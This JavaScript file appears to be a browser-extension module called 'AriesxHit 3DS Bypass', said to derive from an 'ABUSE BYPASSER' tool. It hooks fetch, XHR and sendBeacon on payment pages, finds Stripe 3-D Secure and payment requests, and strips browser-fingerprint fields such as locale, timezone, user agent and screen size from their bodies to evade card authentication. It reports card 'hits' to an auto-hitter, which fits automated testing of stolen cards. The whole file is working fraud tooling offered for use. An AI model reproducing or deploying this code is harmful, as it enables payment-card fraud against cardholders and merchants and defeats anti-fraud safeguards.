// ===================================
// ARIESXHIT INTEGRATED 3DS BYPASS MODULE
// Based on ABUSE BYPASSER v4.2 logic
// Integrated with AriesxHit auto-hitter architecture
// ===================================

(function() {
  'use strict';
  if (window.__ARIES_3DS_INTEGRATED__) return;
  window.__ARIES_3DS_INTEGRATED__ = true;

  let state = {
    bypassActive: false,
    autoHitActive: false,
    bypassCount: 0,
    detectCount: 0,
    pendingCard: null,
    onBypassSuccess: null,
    onBypassFailure: null
  };

  // ==================== STRIPE DETECTION ====================
  const STRIPE_DOMAINS = ['stripe.com', 'stripe.network'];
  const STRIPE_PATHS = ['/v1/3ds', '/v1/payment', '/v1/setup', '/v1/tokens', '/v1/sources', '/authenticate', '/confirm', '/challenge'];

  function isStripe(url) {
    if (!url) return false;
    try {
      const u = new URL(url, location.href);
      return STRIPE_DOMAINS.some(d => u.hostname.includes(d)) || STRIPE_PATHS.some(p => u.pathname.includes(p));
    } catch {
      return STRIPE_DOMAINS.some(d => url.includes(d)) || STRIPE_PATHS.some(p => url.includes(p));
    }
  }

  function isCritical(url) {
    if (!url) return false;
    const critical = ['3ds2/authenticate', '3ds2/challenge', 'verify_challenge', 'three_d_secure'];
    return critical.some(c => url.toLowerCase().includes(c));
  }

  // ==================== ARIESXHIT INTEGRATION ====================
  function sendAriesLog(type, message, card = null) {
    console.log(`[3DS-${type.toUpperCase()}] ${message}`);

    if (type === 'success' && state.onBypassSuccess) {
      state.onBypassSuccess(card);
    } else if (type === 'error' && state.onBypassFailure) {
      state.onBypassFailure(card, message);
    }

    // Also send via chrome runtime if available
    try {
      if (typeof chrome !== 'undefined' && chrome.runtime?.sendMessage) {
        chrome.runtime.sendMessage({
          type: type === 'success' ? 'CARD_HIT' : 'CARD_ERROR',
          card: card,
          message: message,
          code: '3ds_bypass_' + type
        });
      }
    } catch (_) {}
  }

  // ==================== SUCCESS NOTIFICATION ====================
  function showBypassSuccess(url) {
    if (!document.body) return;

    const old = document.getElementById('aries-3ds-success');
    if (old) old.remove();

    const popup = document.createElement('div');
    popup.id = 'aries-3ds-success';
    popup.setAttribute('style', 'position:fixed;top:20px;right:20px;width:280px;background:#1a1625;border:2px solid #22c55e;border-radius:12px;padding:16px;z-index:2147483647;font-family:system-ui,sans-serif;box-shadow:0 10px 40px rgba(0,0,0,0.8);opacity:0;transform:translateY(-20px);transition:all 0.3s ease');

    const header = document.createElement('div');
    header.setAttribute('style', 'display:flex;align-items:center;gap:12px;margin-bottom:12px');

    const icon = document.createElement('div');
    icon.setAttribute('style', 'width:40px;height:40px;background:#22c55e;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;color:white');
    icon.textContent = '✓';

    const titleBox = document.createElement('div');
    const title = document.createElement('div');
    title.setAttribute('style', 'color:#22c55e;font-size:15px;font-weight:700');
    title.textContent = '3DS BYPASSED!';
    const sub = document.createElement('div');
    sub.setAttribute('style', 'color:#666;font-size:11px');
    sub.textContent = 'AriesxHit';
    titleBox.appendChild(title);
    titleBox.appendChild(sub);

    header.appendChild(icon);
    header.appendChild(titleBox);

    const urlBox = document.createElement('div');
    urlBox.setAttribute('style', 'background:#0a0a0a;padding:10px;border-radius:8px;color:#888;font-size:10px;font-family:monospace;word-break:break-all;max-height:50px;overflow:hidden');
    urlBox.textContent = url ? url.substring(0, 80) : '3DS Request bypassed';

    const bar = document.createElement('div');
    bar.setAttribute('style', 'height:3px;background:#22c55e;margin-top:12px;border-radius:2px;width:100%;transition:width 5s linear');

    popup.appendChild(header);
    popup.appendChild(urlBox);
    popup.appendChild(bar);
    document.body.appendChild(popup);

    setTimeout(() => { popup.style.opacity = '1'; popup.style.transform = 'translateY(0)'; }, 50);
    setTimeout(() => { bar.style.width = '0%'; }, 100);
    setTimeout(() => { popup.style.opacity = '0'; popup.style.transform = 'translateY(-20px)'; setTimeout(() => popup.remove(), 300); }, 5000);
  }

  // ==================== CORE BYPASS LOGIC (FROM ABUSE BYPASSER) ====================
  function decodeAndModify(bodyStr) {
    if (!bodyStr) return { modified: false, body: bodyStr };

    let result = bodyStr;
    let modified = false;

    // Pattern 1: Direct locale strings (case insensitive)
    const localePatterns = [
      /en-US/gi, /en_US/gi, /en-GB/gi, /en_GB/gi,
      /"locale":"[^"]*"/gi,
      /"browser_locale":"[^"]*"/gi,
      /"language":"[^"]*"/gi,
      /locale=[^&]*/gi,
      /browser_locale=[^&]*/gi
    ];

    for (const p of localePatterns) {
      const before = result;
      result = result.replace(p, '');
      if (before !== result) modified = true;
    }

    // Pattern 2: URL-encoded base64 in three_d_secure[device_data]
    const deviceDataMatch = result.match(/three_d_secure%5Bdevice_data%5D=([^&]*)/);
    if (deviceDataMatch) {
      try {
        let encoded = deviceDataMatch[1];
        let decoded = decodeURIComponent(encoded);

        try {
          let json = atob(decoded);
          let obj = JSON.parse(json);

          // Remove browser fingerprints
          const fingerprintKeys = ['browser_locale', 'locale', 'language', 'timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth'];

          for (const key of fingerprintKeys) {
            if (key in obj) {
              delete obj[key];
              modified = true;
            }
          }

          if (modified) {
            const newJson = JSON.stringify(obj);
            const newB64 = btoa(newJson);
            const newEncoded = encodeURIComponent(newB64);
            result = result.replace(deviceDataMatch[0], `three_d_secure%5Bdevice_data%5D=${newEncoded}`);
          }
        } catch(e) {
          console.log('[3DS] Failed to decode device_data:', e.message);
        }
      } catch(e) {
        console.log('[3DS] Failed to decode URL parameter:', e.message);
      }
    }

    // Pattern 3: JSON body modifications
    try {
      if (result.startsWith('{') || result.startsWith('%7B')) {
        let jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        let obj = JSON.parse(jsonStr);

        const removeKeys = ['browser_locale', 'locale', 'language', 'timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth'];

        function deepRemove(o) {
          if (typeof o !== 'object' || !o) return;
          for (const key of removeKeys) {
            if (key in o) {
              delete o[key];
              modified = true;
            }
          }
          for (const v of Object.values(o)) {
            if (typeof v === 'object') deepRemove(v);
          }
        }

        deepRemove(obj);
        if (modified) {
          result = JSON.stringify(obj);
          if (bodyStr.startsWith('%')) result = encodeURIComponent(result);
        }
      }
    } catch(e) {
      console.log('[3DS] JSON body processing failed:', e.message);
    }

    return { modified, body: result };
  }

  // ==================== REQUEST INTERCEPTION ====================

  // Helper function to convert body to string
  function bodyToString(b) {
    if (!b) return '';
    if (typeof b === 'string') return b;
    if (b instanceof URLSearchParams) return b.toString();
    if (b instanceof FormData) {
      const p = new URLSearchParams();
      b.forEach((v, k) => p.append(k, v));
      return p.toString();
    }
    if (b instanceof ArrayBuffer) return new TextDecoder().decode(b);
    try {
      return JSON.stringify(b);
    } catch (_) {
      return '';
    }
  }

  // ==================== FETCH INTERCEPTION ====================
  const origFetch = window.fetch;

  window.fetch = async function(input, init) {
    let url, method, headers, body, credentials, mode;

    if (input instanceof Request) {
      url = input.url;
      method = input.method;
      headers = new Headers(input.headers);
      credentials = input.credentials;
      mode = input.mode;
      if (input.body) {
        try {
          const clone = input.clone();
          body = await clone.text();
        } catch(e) {
          body = null;
        }
      }
    } else {
      url = String(input || '');
      method = init?.method || 'GET';
      headers = init?.headers ? new Headers(init.headers) : new Headers();
      body = init?.body;
      credentials = init?.credentials;
      mode = init?.mode;
    }

    // Convert body to string if needed
    if (body && typeof body !== 'string') {
      body = bodyToString(body);
    }

    // Check if this is a Stripe request that needs bypass
    if (state.bypassActive && isStripe(url) && body && method !== 'GET') {
      state.detectCount++;

      if (isCritical(url)) {
        console.log(`[3DS] ★ CRITICAL: ${method} ${url.substring(0, 60)}`);
      }

      const result = decodeAndModify(body);

      if (result.modified) {
        state.bypassCount++;
        console.log('[3DS] ✅ Request modified - fingerprints removed');
        showBypassSuccess(url);

        const newInit = {
          method,
          headers,
          body: result.body,
          credentials: credentials || 'same-origin',
          mode: mode || 'cors'
        };

        return origFetch.call(window, url, newInit);
      }
    }

    if (input instanceof Request) return origFetch.call(window, input, init);
    return origFetch.call(window, url, init || {});
  };

  // ==================== XHR INTERCEPTION ====================
  const XHR = XMLHttpRequest;
  const origOpen = XHR.prototype.open;
  const origSend = XHR.prototype.send;

  XHR.prototype.open = function(method, url) {
    this._ariesUrl = String(url || '');
    this._ariesMethod = method;
    return origOpen.apply(this, arguments);
  };

  XHR.prototype.send = function(body) {
    const url = this._ariesUrl;
    const method = this._ariesMethod;

    if (state.bypassActive && isStripe(url)) {
      state.detectCount++;

      let bodyStr = body;
      if (body && typeof body !== 'string') {
        bodyStr = bodyToString(body);
      }

      if (bodyStr && method !== 'GET') {
        const result = decodeAndModify(bodyStr);
        if (result.modified) {
          state.bypassCount++;
          console.log('[3DS] ✅ XHR Request modified');
          showBypassSuccess(url);
          return origSend.call(this, result.body);
        }
      }
    }

    return origSend.apply(this, arguments);
  };

  // ==================== BEACON INTERCEPTION ====================
  if (navigator.sendBeacon) {
    const origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function(url, data) {
      if (state.bypassActive && isStripe(url)) {
        let bodyStr = data;
        if (data instanceof URLSearchParams) bodyStr = data.toString();
        else if (data instanceof FormData) {
          const params = new URLSearchParams();
          data.forEach((v, k) => params.append(k, v));
          bodyStr = params.toString();
        }
        else if (typeof data !== 'string') {
          try { bodyStr = JSON.stringify(data); } catch(e) {}
        }

        if (bodyStr) {
          const result = decodeAndModify(bodyStr);
          if (result.modified) {
            state.bypassCount++;
            console.log('[3DS] ✅ Beacon Request modified');
            showBypassSuccess(url);
            return origBeacon(url, result.body);
          }
        }
      }
      return origBeacon(url, data);
    };
  }

  // ==================== ARIESXHIT STATE INTEGRATION ====================

  // Listen for AriesxHit state updates
  document.addEventListener('aries-state-update', (e) => {
    const d = e.detail || {};
    state.autoHitActive = d.autoHitActive ?? state.autoHitActive;
    state.bypassActive = state.autoHitActive; // 3DS bypass active when auto-hit is active
  });

  // Public API for AriesxHit integration
  window.AriesxHit3DSIntegrated = {
    setActive: function(active) {
      state.bypassActive = active;
      console.log('[3DS] Bypass ' + (active ? 'enabled' : 'disabled'));
    },

    setPendingCard: function(card) {
      state.pendingCard = card;
    },

    setCallbacks: function(onSuccess, onFailure) {
      state.onBypassSuccess = onSuccess;
      state.onBypassFailure = onFailure;
    },

    getStats: function() {
      return {
        bypassCount: state.bypassCount,
        detectCount: state.detectCount
      };
    }
  };

  // ==================== INITIALIZATION ====================
  function init() {
    console.log('%c[ARIES 3DS BYPASS] Integrated module loaded', 'color: #22c55e; font-size: 14px; font-weight: bold');

    // Try to get initial state from AriesxHit
    try {
      if (typeof chrome !== 'undefined' && chrome.runtime?.sendMessage) {
        chrome.runtime.sendMessage({ type: 'GET_STATE' }, (response) => {
          if (response) {
            state.autoHitActive = response.autoHitActive ?? false;
            state.bypassActive = state.autoHitActive;
          }
        });
      }
    } catch (_) {}
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();